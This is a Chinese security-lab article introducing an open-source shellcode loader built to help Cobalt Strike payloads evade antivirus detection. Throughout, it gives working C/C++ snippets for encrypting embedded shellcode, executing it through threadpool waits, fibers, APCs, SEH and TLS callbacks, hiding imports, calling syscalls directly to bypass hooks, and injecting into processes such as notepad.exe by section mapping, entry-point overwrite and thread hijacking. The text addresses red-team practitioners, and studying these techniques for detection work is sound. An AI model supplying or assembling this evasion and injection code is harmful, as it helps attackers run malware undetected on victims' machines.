**作者：m0ngo0se@知道创宇404实验室  
时间：2020年11月30日**

## 1.前言

shellcode由于可以随意地进行变化和还原，杀软的查杀难度较大。因此将木马shellcode化，再进行shellcode免杀是目前最流行的免杀方式之一。

但是就以Cobalt
Strike的shellcode免杀载荷常规的制作方式来说，需要将shellcode文本加密编码，放入源码想办法免杀，编译等过程太过繁琐，其中不少步骤耗时耗力，更换shellcode之后不少过程又需要重复进行。

本工具旨在解决shellcode载荷生成过程中多数重复性工作，降低免杀的工作时间，将更多的精力放在渗透或者发现新的免杀利用方式上。

本文提到的shellcodeLoader作为星链计划的一员开源，希望能给相关的安全从业者带来帮助。

<https://github.com/knownsec/shellcodeloader>

## 2.什么是shellcode？

shellcode是一种地址无关代码，只要给他EIP就能够开始运行，由于它不像PE有着复杂的结构，因此可以随意变化和复原，shellcode可使用多种语言进行开发，如需了解可[看这](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html#resources)，但是shellcode的开发往往有着相同的步骤，如下图就是shellcode的常用套路。由于其被广泛的恶意使用，因此多数杀软厂商也会针对各种shellcode的特征做查杀。

![shellcode基础原理](https://images.seebug.org/content/images/2020/11/30/1606707775000-locate_dll2.gif-w331s)

## 3.需要什么样的加载器？

shellcode已经有了，但是还需要获得运行权限，而加载器就是为了顺利运行shellcode。由于shellcode的特征，加载器还需要达到下列要求才能够比较长久有效的实现对shellcode的加载。

  * **需求一：对shellcode进行加密(加密的算法不重要，重要的是一定要加密)。**
  * **需求二：尽可能实现生成的自动化，免去一些重复繁琐的工作。**
  * **需求三：加载的方式尽可能多样，最好能够支持拓展。**
  * **需求四：对于shellcode的大小、位数没有特殊要求。**
  * **需求五：适当提供shellcode功能以外的额外选项，如自启动等。**

## 4.shellcode加载器的设计

通过上述的总结，我们基本确定了shellcode加载器的需求。

  * 需求一：这个很容易实现，我们只需要将shellcode加密写入到加载器中，加载器对其按照指定方法进行解密即可。

  * 需求二：通过文本方式加密处理shellcode费时费力，我们最好实现一个生成器，由它负责对shellcode的加密和写入，同时加密的密钥也可以自动随机生成，减少用户交互，同时实现一次一密，能够确保相同的shellcode加密出来的加载器的md5也不相同，达到更好的免杀效果。那么密钥也就必须写入加载器储存起来，加载器通过其中的密钥进行解密。

  * 需求三：同一个生成器的前提下，不同加载方式的加载器应该保持一致的写入方式和获取shellcode的方式，否则会增加许多的判断代码，并且不利于拓展。我能想到的有三种方式：

1.将shellcode写入加载器文件的指定文件偏移，加载器在指定偏移获取。

2.将shellcode写入加载器的资源，加载器通过获取资源的函数获取。

3.将shellcode与加载器进行分离，直接放到同目录的一个文件，使用时就需要两个文件。或者加载器通过网络连接从服务器获取指定的shellcode。

  * 需求四：由于shellcode的大小和不同加载方式的文件大小不尽相同，对于上述上个需求的解决方案中一方案就不太合适。不同的文件大小一个统一的文件偏移找起来就不是特别方便，拓展也需要注意很多问题。然后就二和三解决方案就是很好的实现方式，由于网络的方式我已经实现过一款了，本次选择资源加载。你当然还可以把他们综合到一个平台上。

  * 需求五：这个也很简单，只需要在生成器增加选项，然后将配置文件写入加载器，加载器根据指定配置进行初始化运行即可。

通过众多权衡，我们容易发现，加载器和生成器的设计开发的核心就是 **保持一致**
，可以理解为统一的且易于实现的拓展接口。而通过资源写入shellcode和配置信息，加载再通过资源读出shellcode和配置信息即为最为简单易拓展的方式。生成器的运行流程大致如下：

![](https://images.seebug.org/content/images/2020/11/dedc3454-3355-45e7-a46d-617b8da6720b.png-w331s)

写入该资源也不需要我们去解析资源的具体文件偏移，我们可以使用微软的UpdateResource()函数进行写入。其中resourceID就是写入的资源序号，可随意指定。

    
    
    UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(resourceID), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)shellcode, shellcodeSize)

而生成的加载器大致如下：

![](https://images.seebug.org/content/images/2020/11/e72a91ad-f5d6-4f40-ba86-f234d0abeaf2.png-w331s)

对于资源的获取，微软提供了很方便的函数，无需我们自己通过pe进行解析获取。

    
    
    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
    DWORD totalSize = SizeofResource(NULL, hRsrc);
    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    LPVOID pBuffer = LockResource(hGlobal);

FindResource()函数可以通过指定资源序号找到对应资源的资源句柄，其中的资源序号需要与写入时保持一致。

SizeofResource()函数即可该获取资源的总大小，我们可借此确定shellcode的大小。

LoadResource()，LockResource()函数即可获取我们写入的资源的首地址，其格式可以自由指定，但是一定要和生成器保持一致，同时最好将shellcode放在最后，因为shellcode大小往往是不确定的，这样shellcode前的配置信息就更容易获取。

由于资源的获取没有什么限制，因此拓展也非常简单，当发现一种新的shellcode加载的利用方式，只需要实现从指定的资源序号获取shellcode，并通过新的方式加载它即可。

## 5.加载方式

为了达到更为持久的免杀效果，需要尽可能多加载方式，一种失效了不好免杀，还有更多的可以使用，网上的加载方式已经有许多了，同时他们彼此间往往还可以进行组合，因此加载方式是非常多的。以下是我在网络上搜集的shellcode加载方式。

### 直接加载类

#### CreateThreadpoolWait加载

CreateThreadpoolWait可以创建一个等待对象，该等待对象的回调会在设置的事件对象成为signaled状态或超时时运行，所以我们可借此加载shellcode。

    
    
    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
    PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)Memory, NULL, NULL);
    SetThreadpoolWait(threadPoolWait, event, NULL);
    WaitForSingleObject(event, INFINITE);

  1. 首先通过CreateEvent函数创建一个signaled的事件对象，也就是第三个参数必须为TRUE。否则shellcode将不会得到执行，且进程将一直等待下去。
  2. 使用CreateThreadpoolWait函数创建一个线程池等待回调，我们只需要关心第一个参数也就是等待完成或者超时后要执行的回调函数，这里我们将该回调函数设置为shellcode。
  3. 使用SetThreadpoolWait函数将等待对象和第一步创建的句柄绑定，一个等待对象只能等待几个句柄。当句柄对象变成signaled或超时后会执行等待对象的回调函数。
  4. 使用WaitForSingleObject对第一步的事件对象进行等待。由于我们的事件对象本身就是signaled的，所以设置的回调函数会立马得到执行。如此就执行了shellcode。

#### Fiber加载

纤程是基本的执行单元，其必须有由应用程序进行手动调度。纤程在对其进行调度的线程的上下文中运行。一般来说每个线程可调度多个纤程。

    
    
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)Memory, NULL);
    SwitchToFiber(shellcodeFiber);
    DeleteFiber(shellcodeFiber);

  1. 首先使用ConvertThreadToFiber函数将主线程转换为主纤程。如果线程只有一个纤程是不需要进行转换的，但是如果要使用CreateFiber创建多个纤程进行切换调度，则必须使用该函数进行转换。否则在使用SwitchToFiber函数切换时就会出现访问错误。
  2. 创建一个指向shellcode的地址的纤程。
  3. 切换至shellcode的纤程开始执行shellcode。

#### NtTestAlert加载

NtTestAlert是一个未公开的Win32函数，该函数的效果是如果APC队列不为空的话，其将会直接调用函数KiUserApcDispatcher处理用户APC，如此一来排入的APC可以立马得到运行。

    
    
    pNtTestAlert NtTestAlert = (pNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)Memory;
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
    NtTestAlert();

  1. 首先从ntdll.dll中获取函数NtTestAlert
  2. 排入一个指向shellcode的APC到当前线程
  3. 执行函数NtTestAlert将会直接执行shellcode

#### SEH异常加载

SEH(Structured Exception
Handling)结构化异常处理,是windows操作系统默认的错误处理机制，它允许我们在程序产所错误时使用特定的异常处理函数处理这个异常，尽管提供的功能预取为处理异常，但由于其功能的特点，也往往大量用于反调试。

    
    
    int* p = 0x00000000;
    _try
    {
        *p = 13;
    }
    _except(ExceptFilter()) 
    {
    };

可以使用C/C++的结构化异常处理获得执行流程，将我们的shellcode执行放入异常处理或者异常过滤中，然后触发一个简单的异常，程序就会开始执行我们的shellcode。如下是异常过滤函数，直接执行shellcode即可，当然你也可以将所有的操作放入该函数中。

#### TLS回调加载

TLS提供了一个回调函数，在线程程初始化和终止的时候都会调用，由于回调函数会在入口点(OEP)前执行，而调试器通常会默认在主函数入口点main设置断点，所以常常被用来作为反调试手段使用，同时回调函数允许我们自由编写任意代码，TLS分为静态TLS和动态TLS，静态TLS会把TLS相关数据硬编码在PE文件内。

    
    
    VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
    {
        if (dwReason == DLL_PROCESS_ATTACH)
        {
            //这里进行前三步的初始化
            memcpy(Memory, (char *)pBuffer + sizeof(CONFIG), totalSize - sizeof(CONFIG));
            StreamCrypt((unsigned char*)Memory, totalSize - sizeof(CONFIG), config.key, 128);
        }
    }

因此我们可以将shellcode加载的前三步准备工作放入TLS回调中，在其完成后，在main函数中直接执行shellcode即可。该方式不支持64位。

#### 动态加载

直接加载的方式是直接调用需要的函数，最终编译的文件中所有需要的函数会在其导入表，运行时也就需要导入表找到对应函数的地址。因此导入表会暴露许多信息，而许多杀软就会针对导入表进行检测。动态加载则是动态的获取需要的函数，因此导入表是不会存在许多需要调用的函数的。

    
    
    //0.获取函数
    HMODULE hkmodule = GetModuleHandle(L"kernel32.dll");
    pfnVirtualAlloc fnVirtualAlloc = (pfnVirtualAlloc)GetProcAddress(hkmodule, "VirtualAlloc");
    pfnFindResourceW fnFindResourceW=(pfnFindResourceW)GetProcAddress(hkmodule, "FindResourceW");
    pfnSizeofResource fnSizeofResource=(pfnSizeofResource)GetProcAddress(hkmodule, "SizeofResource");
    pfnLoadResource fnLoadResource=(pfnLoadResource)GetProcAddress(hkmodule, "LoadResource");
    pfnLockResource fnLockResource=(pfnLockResource)GetProcAddress(hkmodule, "LockResource");

本方法和直接加载使用的函数是一样的，只不过通过GetModuleHandle和GetProcAddress函数获取所需要的函数，更进一步可以对函数名进行加密等操作可以达到更好的效果。

#### 动态加载plus

本方式和动态加载的核心原理是一样的，动态获取需要的函数在进行执行，不过动态获取的方式不再是使用GetModuleHandle和GetProcAddress函数，而是自己从peb获取kernel32.dll基址，然后根据其导出表获取需要的函数。该方式不支持64位。

    
    
    ULONGLONG GetKernelFunc(char *funname)
    {
        ULONGLONG kernel32moudle = GetKernel32Moudle();
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)kernel32moudle;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(kernel32moudle + pDos->e_lfanew);
        PIMAGE_DATA_DIRECTORY pExportDir = pNt->OptionalHeader.DataDirectory;
        pExportDir = &(pExportDir[IMAGE_DIRECTORY_ENTRY_EXPORT]);
        DWORD dwOffest = pExportDir->VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(kernel32moudle + dwOffest);
        DWORD dwFunCount = pExport->NumberOfFunctions;
        DWORD dwFunNameCount = pExport->NumberOfNames;
        DWORD dwModOffest = pExport->Name;
        PDWORD pEAT = (PDWORD)(kernel32moudle + pExport->AddressOfFunctions);
        PDWORD pENT = (PDWORD)(kernel32moudle + pExport->AddressOfNames);
        PWORD pEIT = (PWORD)(kernel32moudle + pExport->AddressOfNameOrdinals);
        for (DWORD dwOrdinal = 0; dwOrdinal<dwFunCount; dwOrdinal++)
        {
            if (!pEAT[dwOrdinal])
            {
                continue;
            }
            DWORD dwID = pExport->Base + dwOrdinal;
            DWORD dwFunAddrOffest = pEAT[dwOrdinal];
            for (DWORD dwIndex = 0; dwIndex<dwFunNameCount; dwIndex++)
            {
                if (pEIT[dwIndex] == dwOrdinal)
                {
                    DWORD dwNameOffest = pENT[dwIndex];
                    char* pFunName = (char*)((DWORD)kernel32moudle + dwNameOffest);
                    if (!strcmp(pFunName, funname))
                    {
                        return kernel32moudle + dwFunAddrOffest;
                    }
                }
            }
        }
        return 0;
    }

#### 系统call加载

许多杀软通过ring3层的API
hook获取软件运行时的具体参数和结果，因此可以捕捉软件运行的具体行为，这也是函数序列查杀的实现方式之一，但是可以通过重写ring3层的函数，直接调用系统内核的函数进行绕过，如此一来杀软下的hook并没有什么用，因为我们就没调用。尽管syscall的大部分都是一致的，但是其最核心的系统调用号在不同版本的机器上都不尽相同，因此只要解决了该核心问题，我们就可以重写ring3层需要的函数。

    
    
    pNtAllocateVirtualMemory fnNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetSyscallStub("NtAllocateVirtualMemory");
    LPVOID Memory = NULL;
    SIZE_T uSize = totalSize - sizeof(CONFIG);
    HANDLE hProcess = GetCurrentProcess();
    NTSTATUS status = fnNtAllocateVirtualMemory(hProcess, &Memory, 0, &uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (status != 0)
    {
        return 0;
    }
    memcpy(Memory, (unsigned char*)pBuffer + sizeof(CONFIG), totalSize - sizeof(CONFIG));
    StreamCrypt((unsigned char*)Memory, totalSize - sizeof(CONFIG), config.key, 128);
    //4.执行shellcode
    ((void(*)())Memory)();

本方式使用系统直接call分配内存然后加载shellcode，该方式不支持32位。

  1. 首先获取需要的函数NtAllocateVirtualMemory，其系统调用号在不同版本的机器上也不同，所以需要根据ntdll.dll动态获取其系统调用号。
  2. 然后使用当前进程的句柄分配内存。
  3. 执行shellcode。

### 注入类

#### APC注入

当系统创建一个线程的时候，会同时创建一个与线程相关的队列。这个队列被叫做异步过程调用(APC)队列。为了对线程中的APC队列中的项进行处理，线程必须
将自己设置为可提醒状态，只不过意味着我们的线程在执行的时候已经到达了一个点，在这个点上它能够处理被中断的情况，下边的六个函数能将线程设置为可提醒状态：SleepEx，WaitForSingleObjectEx，WaitForMultipleOBjectsEx，SingalObjectAndWait，GetQueuedCompletionStatusEx，MsgWaitForMultipleObjectsEx当我们调用上边的六个函数之一并将线程设置为可提醒状态的时候，系统首先会检查线程的APC队列，如果队列中至少有一项，那么系统就会开始执行APC队列中的对应的回调函数，然后清除该队列，等待返回。

本方式是经典的注入方式---APC注入。由于APC注入的限制，最好选择多线程的进程进行注入，本例选择了notepad.exe进行注入。

    
    
    for (DWORD threadId : threadIds) 
    {
        HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
        QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
        Sleep(1000 * 2);
    }

  1. 首先获取当前进程和线程的快照
  2. 根据进程名获打开指定进程的句柄，并在其进程空间写入shellcode
  3. 将该进程的所有线程排入指向shellcode的APC

#### Early Brid APC注入

每个用户模式线程都在LdrInitializeThunk函数处开始执行，但是该函数有着如此的调用链：LdrInitializeThunk→LdrpInitialize→_LdrpInitialize→NtTestAlert→KiUserApcDispatcher，因此尽管有着APC注入的限制，但是shellcode依然能够在恢复线程的时候立马得到运行。由于它在线程初始化的非常早期阶段就加载了恶意代码，而随后许多安全产品都将其挂入钩子，这使恶意软件得以执行其恶意行为而不会被检测到。

    
    
    SIZE_T shellSize = totalSize - sizeof(CONFIG);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, buffer, shellSize, NULL);
    delete[] buffer;
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(threadHandle);

  1. 首先以挂起方式创建要注入的进程
  2. 获取创建的进程的进程句柄和主线程句柄
  3. 向其进程空间写入shellcode，并在主线程插入执行shellcode的APC
  4. 恢复主线程，shellcode得到执行

#### NtCreateSection注入

节是一种进程间的共享内存，可以使用NtCreateSection进行创建，进程在读写该共享内存钱，必须使用NtMapViewOfSection函数进行映射，多个进程可以通过映射的内存读写该节。

    
    
        SIZE_T size = shellcodeSize;
        LARGE_INTEGER sectionSize = { size };
        HANDLE sectionHandle = NULL;
        PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
        fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
        fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
        if (Process32First(snapshot, &processEntry))
        {
            while (_wcsicmp(processEntry.szExeFile, L"notepad.exe") != 0)
            {
                Process32Next(snapshot, &processEntry);
            }
        }
        DWORD targetPID = processEntry.th32ProcessID;
        HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
        fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
        memcpy(localSectionAddress, buffer, shellcodeSize);
        delete[] buffer;
        HANDLE targetThreadHandle = NULL;
        fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);

  1. 首先通过NtCreateSection在本进程控件创建一个可读可写可执行的内存节。
  2. 将创建的节映射到本进程，权限为可读可写。
  3. 在目标进程也映射该节，权限为可读可执行即可。
  4. 将shellcode复制入本地映射的内存节,由于该节是共享的，因此目标进程中的该节也会是这串shellcode。
  5. 在目标进程中创建一个远程线程执行shellcode。

#### 入口点劫持注入

众所周知，PE中存在一个入口点，这个入口点正是进程开始执行的地方,所以我们可以通过更改内存中入口点的内容来运行我们的shellcode。由于存在ALSR，入口点还需要加上映像基址，所以我们可以找到内存中的入口点，再将其入口点的位置写入shellcode，即可获取进程的执行权限。

    
    
    STARTUPINFOA si;
    si = {};
    PROCESS_INFORMATION pi = {};
    PROCESS_BASIC_INFORMATION pbi = {};
    #ifdef _M_X64
        DWORD returnLength = 0;
        CreateProcessA(0, (LPSTR)"c:\\windows\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
        NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
        LONGLONG imageBaseOffset = (LONGLONG)pbi.PebBaseAddress + 16;
        LPVOID imageBase = 0;
        ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseOffset, &imageBase, 8, NULL);
        BYTE headersBuffer[4096] = {};
        ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
        LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (LONGLONG)imageBase);
    #else
        DWORD returnLength = 0;
        CreateProcessA(0, (LPSTR)"c:\\windows\\system32\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
        NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
        DWORD imageBaseOffset = (DWORD)pbi.PebBaseAddress + 8;
        LPVOID imageBase = 0;
        ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseOffset, &imageBase, 4, NULL);
        BYTE headersBuffer[4096] = {};
        ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
        LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD)imageBase);
    #endif // x64
        WriteProcessMemory(pi.hProcess, codeEntry, buffer,shellcodeSize, NULL);
        delete[] buffer;
        ResumeThread(pi.hThread);

  1. 首先以挂起的形式创建要注入的进程。
  2. 从进程基本信息中获取映像基址。
  3. 从映像基址中读取PE头信息，再从NT头中获取入口点（该入口点也可以直接从文件中获取），加上获取的映像基址得到真的入口点。
  4. 再入口点写入shellcode，然后恢复线程即可开始执行shellcode。

#### 线程劫持注入

每个进程真正运行的其实是其中的多个线程，每个线程的EIP/RIP指针总是指向着当时的运行点，因此我们只要获取该运行点就相当于获取了线程的执行权限。

    
    
    SuspendThread(threadHijacked);
    GetThreadContext(threadHijacked, &context);
    #ifdef _M_X64
        context.Rip = (DWORD_PTR)remoteBuffer;
    #else
        context.Eip = (DWORD_PTR)remoteBuffer;
    #endif // x64
        SetThreadContext(threadHijacked, &context);
        ResumeThread(threadHijacked);

  1. 首先打开目标进程的进程句柄。
  2. 再目标进程的内存中写入shellcode。
  3. 然后获取目标进程的第一个线程的句柄并将其挂起。
  4. 修改线程的RIP/EIP指针指向shellcode。
  5. 然后恢复该线程开始执行shellcode。

## 6.参考

  * [windows shellcode开发基础](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html#resources)
  * [CreateThreadpoolWait加载](https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait)
  * [Fiber加载](https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber)
  * [NtTestAlert加载](https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert)
  * [SEH异常加载](https://idiotc4t.com/code-and-dll-process-injection/seh-code-execute)
  * [TLS回调加载](https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute)
  * [系统call加载](https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/)
  * [APC注入](https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection)
  * [Early Bird APC注入](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)
  * [Early Brid APC注入原理](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)
  * [NtCreateSection注入](https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection)
  * [入口点劫持注入](https://www.ired.team/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx)
  * [线程劫持注入](https://idiotc4t.com/code-and-dll-process-injection/setcontext-hijack-thread)
  * 《加密与解密4》

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1413/>

